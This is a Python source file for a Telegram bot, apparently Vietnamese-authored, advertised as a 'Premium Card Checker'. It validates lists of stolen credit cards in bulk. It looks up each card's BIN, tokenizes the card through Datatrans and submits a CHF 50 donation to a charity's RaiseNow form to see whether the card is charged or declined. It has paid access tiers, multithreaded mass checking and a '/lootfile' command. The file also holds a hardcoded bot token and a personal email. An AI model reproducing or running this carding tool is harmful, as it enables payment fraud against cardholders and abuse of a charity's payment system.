import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
import requests
import json
import logging
import asyncio
import io
import re
import time
import os
import shutil
from datetime import datetime
from pytz import timezone
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, User
from telegram.constants import ParseMode
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- Cáº¤U HÃŒNH ---
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow"

# --- TÃŠN FILE & THÆ¯ Má»¤C LÆ¯U TRá»® ---
USER_FILE = "authorized_users.txt"
LIMIT_FILE = "user_limits.json" # Giá»›i háº¡n cho /mass
MULTI_LIMIT_FILE = "multi_limits.json" # Giá»›i háº¡n cho /multi
STATS_FILE = "user_stats.json"
PREFS_FILE = "user_prefs.json" # File lÆ°u ngÃ´n ngá»¯
LOG_DIR = "check_logs" # ThÆ° má»¥c chÃ­nh lÆ°u log
BOT_STATUS_FILE = "bot_status.json" # File lÆ°u tráº¡ng thÃ¡i on/off cá»§a bot

# --- GIá»šI Háº N Máº¶C Äá»ŠNH CHO THÃ€NH VIÃŠN ---
DEFAULT_MEMBER_LIMIT = 100 # Cho /mass
MEMBER_THREAD_LIMIT = 3 # Cho /mass
DEFAULT_MULTI_LIMIT = 10 # Cho /multi

# --- Cáº¤U HÃŒNH MÃšI GIá»œ ---
VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')

# --- BIáº¾N TOÃ€N Cá»¤C Äá»‚ THEO DÃ•I TÃC Vá»¤ ÄANG CHáº Y ---
ACTIVE_CHECKS = set()

# --- TIN NHáº®N THÃ”NG BÃO ---
MESSAGES_VI = {
    "bot_off": "ğŸ”´ **THÃ”NG BÃO Báº¢O TRÃŒ** ğŸ”´\n\nBot hiá»‡n Ä‘ang táº¡m thá»i ngoáº¡i tuyáº¿n Ä‘á»ƒ báº£o trÃ¬. CÃ¡c lá»‡nh check sáº½ khÃ´ng hoáº¡t Ä‘á»™ng cho Ä‘áº¿n khi cÃ³ thÃ´ng bÃ¡o má»›i. Cáº£m Æ¡n sá»± kiÃªn nháº«n cá»§a báº¡n!",
    "bot_on": "ğŸŸ¢ **THÃ”NG BÃO HOáº T Äá»˜NG** ğŸŸ¢\n\nBot Ä‘Ã£ hoáº¡t Ä‘á»™ng trá»Ÿ láº¡i. Cáº£m Æ¡n báº¡n Ä‘Ã£ chá» Ä‘á»£i!",
}
MESSAGES_EN = {
    "bot_off": "ğŸ”´ **MAINTENANCE NOTICE** ğŸ”´\n\nThe bot is temporarily offline for maintenance. Checking commands will be disabled until further notice. Thank you for your patience!",
    "bot_on": "ğŸŸ¢ **SERVICE RESUMED NOTICE** ğŸŸ¢\n\nThe bot is back online. Thank you for waiting!",
}

# --- Cáº¤U HÃŒNH LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- KHá»I Táº O ---
# Táº¡o thÆ° má»¥c log náº¿u chÆ°a cÃ³
os.makedirs(LOG_DIR, exist_ok=True)

# --- QUáº¢N LÃ USER & DATA ---
def load_json_file(filename, default_data={}):
    if not os.path.exists(filename):
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def save_json_file(filename, data):
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

def get_user_limit(user_id):
    limits = load_json_file(LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)

def get_user_multi_limit(user_id):
    limits = load_json_file(MULTI_LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MULTI_LIMIT)

def get_user_lang(user_id):
    prefs = load_json_file(PREFS_FILE)
    return prefs.get(str(user_id), None) # Tráº£ vá» None náº¿u chÆ°a set

def set_user_lang(user_id, lang_code):
    prefs = load_json_file(PREFS_FILE)
    prefs[str(user_id)] = lang_code
    save_json_file(PREFS_FILE, prefs)

def is_bot_on():
    """Kiá»ƒm tra xem bot cÃ³ Ä‘ang báº­t hay khÃ´ng."""
    status = load_json_file(BOT_STATUS_FILE, default_data={'is_on': True})
    return status.get('is_on', True)

def set_bot_status(is_on: bool):
    """Äáº·t tráº¡ng thÃ¡i báº­t/táº¯t cho bot."""
    save_json_file(BOT_STATUS_FILE, {'is_on': is_on})

def update_user_stats(user_id, user_info, counts):
    """Cáº­p nháº­t file thá»‘ng kÃª chung cho cÃ¡c user, Ä‘áº£m báº£o táº¥t cáº£ cÃ¡c key Ä‘á»u tá»“n táº¡i."""
    stats = load_json_file(STATS_FILE)
    user_id_str = str(user_id)
    
    default_user_stat = {
        'username': None,
        'full_name': None,
        'total_charged': 0,
        'total_custom': 0,
        'total_decline': 0,
        'total_error': 0,
        'total_invalid': 0,
        'last_check_timestamp': ''
    }

    user_stat_data = stats.get(user_id_str, {})
    if isinstance(user_stat_data, dict):
        default_user_stat.update(user_stat_data)
    
    stats[user_id_str] = default_user_stat
    
    stats[user_id_str]['total_charged'] += counts.get('success', 0)
    stats[user_id_str]['total_custom'] += counts.get('custom', 0)
    stats[user_id_str]['total_decline'] += counts.get('decline', 0)
    stats[user_id_str]['total_error'] += counts.get('error', 0)
    stats[user_id_str]['total_invalid'] += counts.get('invalid_format', 0)
    stats[user_id_str]['last_check_timestamp'] = datetime.now(VIETNAM_TZ).strftime("%Y-%m-%d %H:%M:%S")
    
    stats[user_id_str]['username'] = user_info.username
    stats[user_id_str]['full_name'] = user_info.full_name
    
    save_json_file(STATS_FILE, stats)

# --- CÃC HÃ€M Cá»T LÃ•I ---

# *** FIX Lá»–I TIMEOUT ***
# Giáº£m sá»‘ láº§n thá»­ láº¡i Ä‘á»ƒ trÃ¡nh thá»i gian chá» quÃ¡ lÃ¢u
def make_request_with_retry(session, method, url, max_retries=5, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Láº§n thá»­ {attempt + 1}/{max_retries} cho {url} tháº¥t báº¡i: {e}. Thá»­ láº¡i sau {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: Táº¥t cáº£ {max_retries} láº§n thá»­ láº¡i cho {url} Ä‘á»u tháº¥t báº¡i. Lá»—i cuá»‘i cÃ¹ng: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

def validate_card_format(cc, mes, ano, cvv):
    if not (cc.isdigit() and 10 <= len(cc) <= 19):
        return False, "Sá»‘ tháº» (CC) pháº£i cÃ³ tá»« 10-19 chá»¯ sá»‘."
    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12):
        return False, "ThÃ¡ng (MM) pháº£i lÃ  sá»‘ tá»« 1 Ä‘áº¿n 12."
    if not (ano.isdigit() and len(ano) in [2, 4]):
        return False, "NÄƒm (YY) pháº£i cÃ³ 2 hoáº·c 4 chá»¯ sá»‘."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
        return False, "CVV pháº£i cÃ³ 3 hoáº·c 4 chá»¯ sá»‘."
    return True, ""

def check_card(line):
    parts = line.strip().split('|')
    cc, mes, ano, cvv = "", "", "", ""

    if len(parts) == 4:
        cc, mes, ano, cvv = [p.strip() for p in parts]
    elif len(parts) == 3:
        cc_part, date_part, cvv_part = [p.strip() for p in parts]
        if '/' in date_part:
            date_split = date_part.split('/')
            if len(date_split) == 2:
                cc, mes, ano, cvv = cc_part.strip(), date_split[0].strip(), date_split[1].strip(), cvv_part.strip()
            else:
                return 'invalid_format', line, "Äá»‹nh dáº¡ng ngÃ y thÃ¡ng khÃ´ng há»£p lá»‡ (mm/yy hoáº·c mm/yyyy).", {}
        else:
            return 'invalid_format', line, "Thiáº¿u dáº¥u '/' trong pháº§n ngÃ y thÃ¡ng.", {}
    else:
        return 'invalid_format', line, "Äá»‹nh dáº¡ng khÃ´ng há»£p lá»‡ (cc|mm|yy|cvv hoáº·c cc|mm/yy|cvv).", {}

    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
    if not is_valid:
        return 'invalid_format', line, error_message, {}

    if len(ano) == 2: ano = f"20{ano}"
    
    session = requests.Session()
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    session.headers.update({"User-Agent": ua})
    
    bin_info = {}

    try:
        bin_to_check = cc[:6]
        bin_url = f"[https://bins.antipublic.cc/bins/](https://bins.antipublic.cc/bins/){bin_to_check}"
        bin_headers = {"user-agent": ua, "Pragma": "no-cache", "Accept": "*/*"}
        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10)
        
        if error:
            return 'error', line, f"Lá»—i kiá»ƒm tra BIN: {error}", {}
        
        if bin_response and bin_response.status_code == 200 and "not found" not in bin_response.text:
            try:
                data = bin_response.json()
                if isinstance(data, dict):
                    bin_info.update(data)
                else:
                    logger.warning(f"API BIN tráº£ vá» dá»¯ liá»‡u khÃ´ng pháº£i dictionary cho BIN {bin_to_check}: {data}")
            except json.JSONDecodeError:
                logger.warning(f"Lá»—i phÃ¢n tÃ­ch JSON tá»« BIN check cho BIN {bin_to_check}")

        # *** FIX Lá»–I NONETYPE ***
        # Xá»­ lÃ½ trÆ°á»ng há»£p `country_name` lÃ  `None` (JSON `null`)
        country_name_str = bin_info.get('country_name') or ''
        if country_name_str.upper() == 'VIETNAM':
            return 'decline', line, 'VIETNAM_BIN_DECLINE', bin_info
            
        tokenize_url = "[https://pay.datatrans.com/upp/payment/SecureFields/paymentField](https://pay.datatrans.com/upp/payment/SecureFields/paymentField)"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "[https://pay.datatrans.com](https://pay.datatrans.com)", "Referer": "[https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8](https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8)", "X-Requested-With": "XMLHttpRequest" }
        
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15)
        if error: return 'error', line, f"Lá»—i Tokenize: {error}", bin_info
        if not token_response or token_response.status_code != 200: return 'error', line, f"Lá»—i HTTP {getattr(token_response, 'status_code', 'N/A')} khi Tokenize", bin_info
        
        try:
            token_data = token_response.json()
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            return 'error', line, "Pháº£n há»“i Tokenize khÃ´ng pháº£i JSON", bin_info
        
        payment_url = "[https://api.raisenow.io/payments](https://api.raisenow.io/payments)"
        payment_payload = { "account_uuid": "28b36aa5-879a-438a-886f-434d78d1184d", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "10000", "suggested_amounts": "[10000,15000,20000]", "user_agent": ua}, "solution": {"uuid": "f2166434-2e5c-4575-b32a-b4171f9a8b8c", "name": "Books for Change Spendenformular", "type": "donate"}, "product": {"name": "tamaro", "source_url": "[https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en](https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en)", "uuid": "self-service", "version": "2.15.3"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4781-888b-8783d35ca2f5", "return_url": "[https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result](https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result)" }
        payment_headers = { "Content-Type": "application/json", "Origin": "[https://donate.raisenow.io](https://donate.raisenow.io)", "Referer": "[https://donate.raisenow.io/](https://donate.raisenow.io/)" }
        
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20)
        if error: return 'error', line, f"Lá»—i Payment: {error}", bin_info

        response_text = payment_response.text

        if '"payment_status":"succeeded"' in response_text: return 'success', line, response_text, bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect","url":"https:\\/\\/hooks.stripe.com\\/3d_secure_2\\/hosted?merchant=' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Lá»—i khÃ´ng xÃ¡c Ä‘á»‹nh trong check_card cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"Lá»—i há»‡ thá»‘ng khÃ´ng xÃ¡c Ä‘á»‹nh: {e}", bin_info

def create_progress_bar(current, total, length=10):
    if total == 0: return "[â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 0%"
    fraction = current / total
    filled_len = int(length * fraction)
    bar = 'â–ˆ' * filled_len + 'â–‘' * (length - filled_len)
    return f"[{bar}] {int(fraction * 100)}%"

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return ''
    try:
        return ''.join(chr(0x1F1E6 + ord(char.upper()) - ord('A')) for char in country_code)
    except Exception:
        return ''

# --- CÃC Lá»†NH BOT ---
async def start(update, context):
    user = update.effective_user
    lang = get_user_lang(user.id) or 'en' 

    if user.id in load_users() or user.id == ADMIN_ID:
        if lang == 'vi':
            await update.message.reply_text(f"**ChÃ o má»«ng trá»Ÿ láº¡i, {user.first_name}!**\nDÃ¹ng /help Ä‘á»ƒ xem cÃ¡c lá»‡nh báº¡n cÃ³ thá»ƒ sá»­ dá»¥ng.")
        else:
            await update.message.reply_text(f"**Welcome back, {user.first_name}!**\nUse /help to see the available commands.")
    else:
        welcome_message = (
            "**Welcome to the Premium Card Checker Bot!** ğŸ¤–\n\n"
            "This bot utilizes a powerful `Charge 0.5$ Api Auth` to provide accurate card checking services.\n\n"
            "**Your current status:** `GUEST`\n"
            f"Your Telegram ID: `{user.id}`\n\n"
            "**ğŸŒŸ Upgrade to Premium! ğŸŒŸ**\n"
            "Unlock the full potential of the bot with a Premium membership:\n"
            "âœ… **Unlimited Checking:** No restrictions on the number of cards you can check.\n"
            "âœ… **Priority Support:** Get faster assistance from the admin.\n\n"
            f"To get access and upgrade to Premium, please contact the admin with your ID: {ADMIN_USERNAME}"
        )
        await update.message.reply_text(welcome_message)

async def info(update, context):
    await update.message.reply_text(f"ğŸ†” ID Telegram cá»§a báº¡n lÃ : `{update.effective_user.id}`")

# <<< Sá»¬A Lá»–I /help >>>
# HÃ m giá» Ä‘Ã¢y nháº­n toÃ n bá»™ Ä‘á»‘i tÆ°á»£ng `user` thay vÃ¬ chá»‰ `user_id`
async def get_help_text(user: User, lang_code: str):
    """Táº¡o ná»™i dung help dá»±a trÃªn vai trÃ² vÃ  ngÃ´n ngá»¯ cá»§a user."""
    user_id = user.id
    user_mass_limit = get_user_limit(user_id)
    user_multi_limit = get_user_multi_limit(user_id)
    
    # Sá»­ dá»¥ng f-string Ä‘á»ƒ trÃ¡nh lá»—i KeyError tá»« .format()
    text_vi = {
        "public": (
            "**Báº£ng Lá»‡nh CÃ´ng Khai** ğŸ› ï¸\n"
            "ChÃ o má»«ng báº¡n! DÆ°á»›i Ä‘Ã¢y lÃ  cÃ¡c lá»‡nh cÆ¡ báº£n báº¡n cÃ³ thá»ƒ sá»­ dá»¥ng:\n\n"
            "ğŸ”¹ `/start`\n"
            "   - *MÃ´ táº£:* Khá»Ÿi Ä‘á»™ng bot vÃ  nháº­n ID Telegram cá»§a báº¡n.\n\n"
            "ğŸ”¹ `/info`\n"
            "   - *MÃ´ táº£:* Láº¥y láº¡i ID Telegram cá»§a báº¡n má»™t cÃ¡ch nhanh chÃ³ng.\n\n"
            "ğŸ”¹ `/help`\n"
            "   - *MÃ´ táº£:* Hiá»ƒn thá»‹ báº£ng trá»£ giÃºp nÃ y.\n\n"
            f"**NÃ¢ng cáº¥p Premium:**\nÄá»ƒ sá»­ dá»¥ng cÃ¡c tÃ­nh nÄƒng check khÃ´ng giá»›i háº¡n, vui lÃ²ng liÃªn há»‡ Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**Báº£ng Lá»‡nh ThÃ nh ViÃªn** ğŸ‘¤\n"
            "Báº¡n Ä‘Ã£ Ä‘Æ°á»£c cáº¥p quyá»n! Sá»­ dá»¥ng cÃ¡c lá»‡nh sau Ä‘á»ƒ check tháº»:\n\n"
            "ğŸ”¹ `/cs <tháº»>`\n"
            "   - *MÃ´ táº£:* Kiá»ƒm tra má»™t tháº» tÃ­n dá»¥ng duy nháº¥t.\n"
            "   - *VÃ­ dá»¥:* `/cs 403163...|11/28|123`\n\n"
            "ğŸ”¹ `/bin <bin>`\n"
            "   - *MÃ´ táº£:* Láº¥y thÃ´ng tin cá»§a má»™t Ä‘áº§u sá»‘ tháº» (BIN).\n"
            "   - *VÃ­ dá»¥:* `/bin 403163`\n\n"
            "ğŸ”¹ `/multi`\n"
            f"   - *MÃ´ táº£:* Kiá»ƒm tra nhiá»u tháº» trong má»™t tin nháº¯n (tá»‘i Ä‘a {user_multi_limit} tháº»).\n"
            "   - *CÃ¡ch dÃ¹ng:* GÃµ lá»‡nh vÃ  dÃ¡n danh sÃ¡ch tháº» bÃªn dÆ°á»›i.\n\n"
            "ğŸ”¹ `/mass<sá»‘ luá»“ng>`\n"
            "   - *MÃ´ táº£:* Kiá»ƒm tra hÃ ng loáº¡t tháº» tá»« má»™t tá»‡p `.txt`.\n"
            "   - *CÃ¡ch dÃ¹ng:* Gá»­i tá»‡p `.txt` vÃ  Ä‘iá»n caption lÃ  `/mass` hoáº·c `/mass<sá»‘ luá»“ng>`.\n"
            "   - *VÃ­ dá»¥:* `/mass3` Ä‘á»ƒ cháº¡y 3 luá»“ng.\n\n"
            f"ğŸ’³ **Háº¡n má»©c cá»§a báº¡n:** `{user_mass_limit}` lines/file.\n"
            f"ğŸŒŸ **NÃ¢ng cáº¥p Premium:** LiÃªn há»‡ {ADMIN_USERNAME} Ä‘á»ƒ check khÃ´ng giá»›i háº¡n."
        )
    }
    
    text_en = {
        "public": (
            "**Public Command Menu** ğŸ› ï¸\n"
            "Welcome! Here are the basic commands you can use:\n\n"
            "ğŸ”¹ `/start`\n"
            "   - *Description:* Starts the bot and gets your Telegram ID.\n\n"
            "ğŸ”¹ `/info`\n"
            "   - *Description:* Quickly retrieves your Telegram ID again.\n\n"
            "ğŸ”¹ `/help`\n"
            "   - *Description:* Displays this help menu.\n\n"
            f"**Upgrade to Premium:**\nTo use unlimited checking features, please contact the Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**Member Command Menu** ğŸ‘¤\n"
            "You are authorized! Use these commands to check cards:\n\n"
            "ğŸ”¹ `/cs <card>`\n"
            "   - *Description:* Checks a single credit card.\n"
            "   - *Example:* `/cs 403163...|11/28|123`\n\n"
            "ğŸ”¹ `/bin <bin>`\n"
            "   - *Description:* Retrieves information for a card's BIN.\n"
            "   - *Example:* `/bin 403163`\n\n"
            "ğŸ”¹ `/multi`\n"
            f"   - *Description:* Checks multiple cards in one message (max {user_multi_limit} cards).\n"
            "   - *Usage:* Type the command and paste the card list below it.\n\n"
            "ğŸ”¹ `/mass<threads>`\n"
            "   - *Description:* Checks a list of cards from a `.txt` file.\n"
            "   - *How to use:* Send a `.txt` file with the command as the caption.\n"
            "   - *Example:* `/mass3` to run with 3 threads.\n\n"
            f"ğŸ’³ **Your Limit:** `{user_mass_limit}` lines/file.\n"
            f"ğŸŒŸ **Upgrade to Premium:** Contact {ADMIN_USERNAME} for unlimited checking."
        )
    }

    admin_commands = (
        "**Báº£ng Lá»‡nh Quáº£n Trá»‹ ViÃªn** ğŸ‘‘\n"
        "ToÃ n quyá»n quáº£n lÃ½ bot vá»›i cÃ¡c lá»‡nh sau:\n\n"
        "**Quáº£n lÃ½ Bot:**\n"
        "ğŸ”¹ `/on`, `/off` - Báº­t/Táº¯t bot vÃ  thÃ´ng bÃ¡o.\n\n"
        "**Quáº£n lÃ½ User & Tin nháº¯n:**\n"
        "ğŸ”¹ `/add <user_id>`\n"
        "ğŸ”¹ `/ban <user_id>`\n"
        "ğŸ”¹ `/show` - Xem danh sÃ¡ch user.\n"
        "ğŸ”¹ `/send <user_id> <tin_nháº¯n>`\n"
        "ğŸ”¹ `/sendall <tin_nháº¯n>`\n\n"
        "**Quáº£n lÃ½ Giá»›i háº¡n:**\n"
        "ğŸ”¹ `/addlimit <user_id> <sá»‘>`\n"
        "ğŸ”¹ `/addlimitmulti <user_id> <sá»‘>`\n\n"
        "**GiÃ¡m sÃ¡t & Lá»‹ch sá»­:**\n"
        "ğŸ”¹ `/showcheck` - Xem thá»‘ng kÃª check.\n"
        "ğŸ”¹ `/lootfile <user_id>` - Láº¥y láº¡i file káº¿t quáº£."
    )

    lang_texts = text_vi if lang_code == 'vi' else text_en
    
    if user_id == ADMIN_ID:
        return f"{admin_commands}\n\n{text_vi['member'].split('ğŸ’³ **Háº¡n má»©c cá»§a báº¡n:**')[0].strip()}"
    elif user_id in load_users():
        return f"{lang_texts['member']}\n\n{lang_texts['public']}"
    else:
        return lang_texts['public']

async def help_command(update, context):
    user = update.effective_user
    lang = get_user_lang(user.id)

    if not lang:
        keyboard = [
            [
                InlineKeyboardButton("ğŸ‡»ğŸ‡³ Tiáº¿ng Viá»‡t", callback_data="setlang_vi"),
                InlineKeyboardButton("ğŸ‡¬ğŸ‡§ English", callback_data="setlang_en"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Vui lÃ²ng chá»n ngÃ´n ngá»¯ cá»§a báº¡n / Please select your language:",
            reply_markup=reply_markup
        )
    else:
        # Truyá»n toÃ n bá»™ Ä‘á»‘i tÆ°á»£ng `user` vÃ o hÃ m
        help_text = await get_help_text(user, lang)
        await update.message.reply_text(help_text, disable_web_page_preview=True)

async def add_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("CÃº phÃ¡p: `/add <user_id>`"); return
    try:
        user_to_add = int(context.args[0]); users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"â„¹ï¸ NgÆ°á»i dÃ¹ng `{user_to_add}` Ä‘Ã£ cÃ³ trong danh sÃ¡ch.")
        else:
            users.add(user_to_add); save_users(users)
            await update.message.reply_text(f"âœ… ÄÃ£ thÃªm ngÆ°á»i dÃ¹ng `{user_to_add}`.")
    except ValueError: await update.message.reply_text("âŒ User ID khÃ´ng há»£p lá»‡.")

async def ban_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("CÃº phÃ¡p: `/ban <user_id>`"); return
    try:
        user_to_ban = int(context.args[0]); users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban); save_users(users)
            user_log_dir = os.path.join(LOG_DIR, str(user_to_ban))
            if os.path.exists(user_log_dir):
                shutil.rmtree(user_log_dir)
            await update.message.reply_text(f"ğŸ—‘ ÄÃ£ xÃ³a ngÆ°á»i dÃ¹ng `{user_to_ban}` vÃ  toÃ n bá»™ log.")
        else:
            await update.message.reply_text(f"â„¹ï¸ KhÃ´ng tÃ¬m tháº¥y ngÆ°á»i dÃ¹ng `{user_to_ban}`.")
    except ValueError: await update.message.reply_text("âŒ User ID khÃ´ng há»£p lá»‡.")

async def show_users(update, context):
    if update.effective_user.id != ADMIN_ID: return
    users = load_users()
    if not users:
        await update.message.reply_text("ğŸ“­ Danh sÃ¡ch ngÆ°á»i dÃ¹ng trá»‘ng."); return
    
    message_lines = ["ğŸ‘¥ **Danh sÃ¡ch ID & Háº¡n má»©c:**\n"]
    for user_id in sorted(list(users)):
        limit_mass = get_user_limit(user_id)
        limit_multi = get_user_multi_limit(user_id)
        message_lines.append(f"- `{user_id}` | Mass: `{limit_mass}` | Multi: `{limit_multi}`")
        
    await update.message.reply_text("\n".join(message_lines))

async def add_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("CÃº phÃ¡p: `/addlimit <user_id> <sá»‘_dÃ²ng_thÃªm>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("âŒ Dá»¯ liá»‡u khÃ´ng há»£p lá»‡. HÃ£y cháº¯c cháº¯n ID vÃ  sá»‘ lÆ°á»£ng lÃ  sá»‘."); return

    limits = load_json_file(LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(LIMIT_FILE, limits)
    
    await update.message.reply_text(f"âœ… **Cáº­p nháº­t giá»›i háº¡n /mass thÃ nh cÃ´ng!**\n\n"
                                      f"ğŸ‘¤ **User ID:** `{target_user_id_str}`\n"
                                      f"ğŸ“ˆ **Giá»›i háº¡n cÅ©:** `{old_limit}`\n"
                                      f"â• **ÄÃ£ thÃªm:** `{amount_to_add}`\n"
                                      f"ğŸ“Š **Tá»•ng má»›i:** `{new_limit}`")

async def add_multi_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("CÃº phÃ¡p: `/addlimitmulti <user_id> <sá»‘_tháº»_thÃªm>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("âŒ Dá»¯ liá»‡u khÃ´ng há»£p lá»‡. HÃ£y cháº¯c cháº¯n ID vÃ  sá»‘ lÆ°á»£ng lÃ  sá»‘."); return

    limits = load_json_file(MULTI_LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MULTI_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(MULTI_LIMIT_FILE, limits)
    
    await update.message.reply_text(f"âœ… **Cáº­p nháº­t giá»›i háº¡n /multi thÃ nh cÃ´ng!**\n\n"
                                      f"ğŸ‘¤ **User ID:** `{target_user_id_str}`\n"
                                      f"ğŸ“ˆ **Giá»›i háº¡n cÅ©:** `{old_limit}`\n"
                                      f"â• **ÄÃ£ thÃªm:** `{amount_to_add}`\n"
                                      f"ğŸ“Š **Tá»•ng má»›i:** `{new_limit}`")

async def bin_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"Báº¡n khÃ´ng Ä‘Æ°á»£c phÃ©p sá»­ dá»¥ng lá»‡nh nÃ y. Vui lÃ²ng liÃªn há»‡ Admin: {ADMIN_USERNAME}")
        return

    if not context.args or not context.args[0].isdigit() or not (6 <= len(context.args[0]) <= 8):
        await update.message.reply_text("Vui lÃ²ng cung cáº¥p má»™t BIN há»£p lá»‡ (6-8 chá»¯ sá»‘).\nSá»­ dá»¥ng: `/bin <bin_number>`")
        return
    
    bin_to_check = context.args[0]
    msg = await update.message.reply_text(f"â³ Äang kiá»ƒm tra BIN `{bin_to_check}`...")

    try:
        session = requests.Session()
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        session.headers.update({"User-Agent": ua})
        
        bin_url = f"[https://bins.antipublic.cc/bins/](https://bins.antipublic.cc/bins/){bin_to_check}"
        bin_response, error = make_request_with_retry(session, 'get', bin_url, timeout=10)

        if error or not bin_response or bin_response.status_code != 200 or "not found" in bin_response.text:
            await msg.edit_text(f"âŒ KhÃ´ng tÃ¬m tháº¥y thÃ´ng tin cho BIN `{bin_to_check}`.")
            return

        bin_info = bin_response.json()

        # *** FIX Lá»–I NONETYPE ***
        brand = (bin_info.get('brand') or 'N/A').upper()
        card_type = (bin_info.get('type') or 'N/A').upper()
        level = (bin_info.get('level') or 'N/A').upper()
        bank = bin_info.get('bank') or 'None' # Bank name shouldn't be uppercased
        country_name = (bin_info.get('country_name') or 'N/A').upper()
